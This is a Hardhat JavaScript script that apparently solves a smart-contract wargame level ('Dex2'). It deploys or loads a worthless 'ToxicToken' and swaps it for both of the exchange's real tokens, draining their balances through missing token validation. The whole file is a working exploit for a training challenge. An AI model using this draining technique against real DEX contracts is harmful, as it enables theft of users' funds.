const hre = require("hardhat");
const deploy = require("./deploy").deploy
const ethers = hre.ethers;

require('dotenv').config()

async function main() {
  const owner = new ethers.Wallet(process.env.PK, ethers.provider)

  const dex = await ethers.getContractAt("Dex2", process.env.DEX2)

  const toxic = hre.network.name == "hardhat"
    ? await deploy()
    : await ethers.getContractAt("ToxicToken", process.env.TOXIC);

  const t1 = await ethers.getContractAt("IERC20", await dex.token1());
  const t2 = await ethers.getContractAt("IERC20", await dex.token2());

  const printBals = async () => {
    console.log("Dex t1 balance:", (await dex.balanceOf(t1.address, dex.address)).toString());
    console.log("Dex t2 balance:", (await dex.balanceOf(t2.address, dex.address)).toString());
    console.log("Owner t1 balance:", (await dex.balanceOf(t1.address, owner.address)).toString());
    console.log("Owner t2 balance:", (await dex.balanceOf(t2.address, owner.address)).toString());
  }

  console.log("BEFORE");
  await printBals()

  const amount = await toxic.balanceOf(owner.address)

  tx = await dex.connect(owner).swap(toxic.address, t1.address, amount)
  await tx.wait()
  tx = await dex.connect(owner).swap(toxic.address, t2.address, amount)
  await tx.wait()

  console.log("AFTER");
  await printBals()
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
